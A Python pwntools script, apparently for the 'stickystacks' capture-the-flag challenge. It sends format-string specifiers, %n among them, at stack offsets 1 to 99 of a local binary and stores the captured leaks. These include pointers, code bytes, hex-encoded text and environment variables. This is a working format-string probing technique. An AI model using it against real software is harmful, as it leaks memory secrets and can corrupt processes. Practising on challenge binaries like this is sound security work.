from pwn import *

def run(give):
    r = process("./stickystacks")
    r.read()
    r.send(give)

    data = r.read()
    try:
        data = data.decode('ascii')
    except:
        data = str(data)
    r.close()
    return data

def togive(i,mode):
    return f"%{i}${mode}\n"

def extractData(data):
    return data.replace("Welcome,","")

n = []
s = []
c = []
d = []
x = []
p = []

for i in range(1,100):
    for mode in 'nscdxp':
        print(mode)
        give = togive(i, mode)
        data = extractData(run(give))
        exec(f"{mode}.append(data)")
    #print(data)

print(n,s, c, d, x ,p)

'''
[' \n\n', ' ', ' ', ' \n\n', ' \n\n', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' \n', ' \n', ' ', ' ', ' ', ' \n', ' ', ' ', ' \n', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' \n', ' \n', ' \n', ' ', ' ', ' ', ' \n', ' ', ' ', ' ', ' \n', ' ', ' ', ' \n', ' ', ' \n', ' \n', ' \n', ' \n', ' \n', ' \n', ' \n', ' \n', ' \n', ' \n', ' \n', ' \n', ' \n', ' \n', ' \n']

['  \n\n', ' (null)\n\n', ' (null)\n\n', ' %4$s\n\n\n', "b' \\x904}\\x01\\n\\n'", ' ', ' ', ' (null)\n\n', ' (null)\n\n', ' (null)\n', ' (null)\n', ' ', ' ', ' (null)\n', ' (null)\n', ' (null)\n', ' (null)\n', ' ', ' ', ' (null)\n', ' (null)\n', ' (null)\n', ' (null)\n', ' ', ' ', ' ', ' (null)\n', ' (null)\n', ' (null)\n', ' (null)\n', ' (null)\n', ' (null)\n', ' (null)\n', ' (null)\n', ' (null)\n', ' (null)\n', ' (null)\n', ' (null)\n', ' (null)\n', ' (null)\n', ' (null)\n', ' (null)\n', ' (null)\n', ' (null)\n', ' (null)\n', ' (null)\n', "b' \\xf3\\x0f\\x1e\\xfaAWL\\x8d=\\xa3)\\n'", ' ', "b' \\x98$\\xad\\xfb\\n'", ' \n', "b' \\xb8\\n'", ' (null)\n', "b' \\x89\\xc7\\xe8\\xf4|\\x01\\n'", "b' 2\\xf9\\x1a\\xa1\\xfe\\x7f\\n'", ' ', "b' \\xf3\\x0f\\x1e\\xfaUH\\x89\\xe5H\\x8b\\x056,\\n'", 'b" \\x05\\xb9\\xb3\\xc2\'~C4\\xf9v\\xc4\\xaa\\x85+\\xdeTx86_64\\n"', "b' \\xf3\\x0f\\x1e\\xfaAWL\\x8d=\\xa3)\\n'", ' ', "b' \\xf3\\x0f\\x1e\\xfa1\\xedI\\x89\\xd1^H\\x89\\xe2H\\x83\\xe4\\xf0PTI\\xc7\\xc0\\xd0\\x14@\\n'", ' (null)\n', ' (null)\n', ' (null)\n', ' ', ' ', ' (null)\n', ' (null)\n', ' (null)\n', ' ', "b' 2)\\x0b\\xb9\\xff\\x7f\\n'", "b' A\\x89E\\t\\xfc\\x7f\\n'", ' \n', ' (null)\n', ' (null)\n', "b' \\xf3\\x0f\\x1e\\xfa1\\xedI\\x89\\xd1^H\\x89\\xe2H\\x83\\xe4\\xf0PTI\\xc7\\xc0\\xd0\\x14@\\n'", ' \x01\n', ' (null)\n', ' (null)\n', "b' \\xf4\\x90\\xf3\\x0f\\x1e\\xfa\\xc3f.\\x0f\\x1f\\x84\\n'", ' \x1c\n', ' ', ' ', ' ./stickystacks\n', ' (null)\n', ' CONDA_EXE=/opt/anaconda/bin/conda\n', ' SSH_AUTH_SOCK=/run/user/1000/keyring/ssh\n', ' SESSION_MANAGER=local/hackerbook:@/tmp/.ICE-unix/1197,unix/hackerbook:/tmp/.ICE-unix/1197\n', ' GNOME_TERMINAL_SCREEN=/org/gnome/Terminal/screen/41775f8c_45c5_42f1_aa89_e2bb56c5dda9\n', ' _CE_M=\n', ' NO_AT_BRIDGE=1\n', ' LANG=en_SG.UTF-8\n', ' CONDA_PREFIX=/opt/anaconda\n', ' XDG_CURRENT_DESKTOP=GNOME\n', ' DISPLAY=:0\n', ' DBUS_STARTER_BUS_TYPE=session\n', ' CONDA_PYTHON_EXE=/opt/anaconda/bin/python\n', ' USER=hacker\n', ' HOME=/home/hacker\n', ' XDG_MENU_PREFIX=gnome-\n']

 [' p\n\n', ' \x00\n\n', ' \x00\n\n', ' \x01\n\n', ' `\n\n', ' C\n\n', '  \n\n', ' \x00\n\n', ' \x00\n\n', ' \x00\n', ' \x00\n', ' \x00\n', ' r\n', ' \x00\n', ' \x00\n', ' \x00\n', ' \x00\n', ' \x00\n', ' 1\n', ' \x00\n', ' \x00\n', ' \x00\n', ' \x00\n', ' \x00\n', ' 3\n', ' 9\n', ' \x00\n', ' \x00\n', ' \x00\n', ' \x00\n', ' \x00\n', ' \x00\n', ' \x00\n', ' \x00\n', ' \x00\n', ' \x00\n', ' \x00\n', ' \x00\n', ' \x00\n', ' \x00\n', ' \x00\n', ' \x00\n', ' \x00\n', ' \x00\n', ' \x00\n', ' \x00\n', ' `\n', ' @\n', "b' \\xa0\\n'", ' P\n', ' U\n', ' \x00\n', ' %\n', ' X\n', ' \x00\n', ' \x1b\n', ' I\n', ' `\n', "b' \\xe0\\n'", ' \x10\n', ' \x00\n', ' \x00\n', ' \x00\n', ' \x1d\n', ' s\n', ' \x00\n', ' \x00\n', ' \x00\n', ' \x01\n', ' x\n', ' h\n', "b' \\xe0\\n'", ' \x00\n', ' \x00\n', ' \x10\n', "b' \\xb0\\n'", ' \x00\n', ' \x00\n', ' >\n', "b' \\xa8\\n'", ' \x1c\n', ' \x01\n', ' 2\n', ' \x00\n', ' A\n', ' c\n', "b' \\x8c\\n'", "b' \\xe6\\n'", ' <\n', ' C\n', ' R\n', ' c\n', ' ~\n', "b' \\x98\\n'", "b' \\xa3\\n'", "b' \\xc1\\n'", "b' \\xeb\\n'", "b' \\xf7\\n'", ' \t\n']

  [' 512374336\n\n', ' 0\n\n', ' 0\n\n', ' 1222597073\n\n', ' -220890528\n\n', ' 1933988931\n\n', ' 1853187616\n\n', ' 0\n\n', ' 0\n\n', ' 0\n', ' 0\n', ' 1634729984\n', ' 842097778\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 808925489\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 892611891\n', ' 12345\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 4199520\n', ' 942941504\n', ' 29221536\n', ' -200121424\n', ' 4199509\n', ' 0\n', ' -1899381979\n', ' 1533867096\n', ' 847454208\n', ' 4199451\n', ' 19471481\n', ' 4199520\n', ' -292572939\n', ' 4198672\n', ' 0\n', ' 0\n', ' 0\n', ' 1552000769\n', ' -1904146417\n', ' 0\n', ' 0\n', ' 0\n', ' 1\n', ' 599390216\n', ' -829708984\n', ' 2095886816\n', ' 0\n', ' 0\n', ' 4198672\n', ' -1547036048\n', ' 0\n', ' 0\n', ' 4198718\n', ' -25568664\n', ' 28\n', ' 1\n', ' 1984878898\n', ' 0\n', ' -152254143\n', ' -1514489501\n', ' -927028852\n', ' 1369979366\n', ' 192207420\n', ' -1165047229\n', ' 885664338\n', ' 429296227\n', ' 1332533886\n', ' -1469371752\n', ' 321714851\n', ' 1532893889\n', ' 1888348907\n', ' -497329417\n', ' -1688745207\n']

   [' af9e1620\n\n', ' 0\n\n', ' 0\n\n', ' 46d9feb1\n\n', ' 3ecdea60\n\n', ' 73465443\n\n', ' 6e756620\n\n', ' 0\n\n', ' 0\n\n', ' 0\n', ' 0\n', ' 61700000\n', ' 32316472\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 30373931\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 35342d33\n', ' 3039\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 0\n', ' 401460\n', ' 38342500\n', ' 4e32a0\n', ' 34cbfbb0\n', ' 401455\n', ' 0\n', ' 6bde1b25\n', ' d4ae6df8\n', ' 47a8f000\n', ' 40141b\n', ' cb8ba7c9\n', ' 401460\n', ' 46fe97ba\n', ' 401110\n', ' 0\n', ' 0\n', ' 0\n', ' 11a8799a\n', ' 6406f39a\n', ' 0\n', ' 0\n', ' 0\n', ' 1\n', ' 3e92c3b8\n', ' 603bdc08\n', ' 287bf1e0\n', ' 0\n', ' 0\n', ' 401110\n', ' d83f82b0\n', ' 0\n', ' 0\n', ' 40113e\n', ' 136f2a38\n', ' 1c\n', ' 1\n', ' 38a8e932\n', ' 0\n', ' f81d941\n', ' ceda4963\n', ' 7fb4a98c\n', ' e2daa9e6\n', ' 4395da3c\n', ' 21f82a43\n', ' a5732a52\n', ' 8cd2a63\n', ' dca41a7e\n', ' b042da98\n', ' 640b5aa3\n', ' da9f8ac1\n', ' e44baaeb\n', ' 118a8af7\n', ' 8ee8cb09\n']

   [' 0x7ffffdcad070\n\n', ' (nil)\n\n', ' (nil)\n\n', ' 0x7ffe35132f41\n\n', ' 0x7f17582cca60\n\n', ' 0x6572612073465443\n\n', ' 0x216e756620\n\n', ' (nil)\n\n', ' (nil)\n\n', ' (nil)\n', ' (nil)\n', ' 0x6f77737361700000\n', ' 0x3332316472\n', ' (nil)\n', ' (nil)\n', ' (nil)\n', ' (nil)\n', ' 0x2f312f3100000000\n', ' 0x30373931\n', ' (nil)\n', ' (nil)\n', ' (nil)\n', ' (nil)\n', ' 0x3231000000000000\n', ' 0x38372d3635342d33\n', ' 0x3039\n', ' (nil)\n', ' (nil)\n', ' (nil)\n', ' (nil)\n', ' (nil)\n', ' (nil)\n', ' (nil)\n', ' (nil)\n', ' (nil)\n', ' (nil)\n', ' (nil)\n', ' (nil)\n', ' (nil)\n', ' (nil)\n', ' (nil)\n', ' (nil)\n', ' (nil)\n', ' (nil)\n', ' (nil)\n', ' (nil)\n', ' 0x401460\n', ' 0x702438342520\n', ' 0x19462a0\n', ' 0x7ffe85accad0\n', ' 0x401455\n', ' (nil)\n', ' 0x7f7ffaafdb25\n', ' 0x7ffd5c5dfc68\n', ' 0x19adf9000\n', ' 0x40141b\n', ' 0x7ffe6f9ff899\n', ' 0x401460\n', ' 0xb1f5c2008ed7414c\n', ' 0x401110\n', ' (nil)\n', ' (nil)\n', ' (nil)\n', ' 0x51e1292d83281259\n', ' 0x71ac430b338db746\n', ' (nil)\n', ' (nil)\n', ' (nil)\n', ' 0x1\n', ' 0x7ffe957a4c88\n', ' 0x7fff6fe30038\n', ' 0x7f314b3631e0\n', ' (nil)\n', ' (nil)\n', ' 0x401110\n', ' 0x7ffeb6f45d70\n', ' (nil)\n', ' (nil)\n', ' 0x40113e\n', ' 0x7ffdd9ac81f8\n', ' 0x1c\n', ' 0x1\n', ' 0x7ffe87cc2932\n', ' (nil)\n', ' 0x7fffdba81941\n', ' 0x7fffedd1d963\n', ' 0x7fff536da98c\n', ' 0x7ffcf4a079e6\n', ' 0x7ffef62f5a3c\n', ' 0x7fffeaf7ca43\n', ' 0x7ffc3ab0ea52\n', ' 0x7ffdb1d81a63\n', ' 0x7ffc35aaba7e\n', ' 0x7ffcdc2c8a98\n', ' 0x7ffd21edeaa3\n', ' 0x7ffc2899dac1\n', ' 0x7ffc11f41aeb\n', ' 0x7ffc13b83af7\n', ' 0x7ffdf16c8b09\n']

'''
